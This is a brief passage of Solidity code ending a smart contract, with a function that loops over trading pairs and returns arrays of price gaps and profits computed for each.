        uint256[] memory gap = new uint256[](length);
        uint256[] memory profit = new uint256[](length);
        for(uint256 i = 0; i< length; i++){
            (gap[i],profit[i]) = excessAndSellForPair(pairs[i]);
        }
        return (gap,profit);
    }


}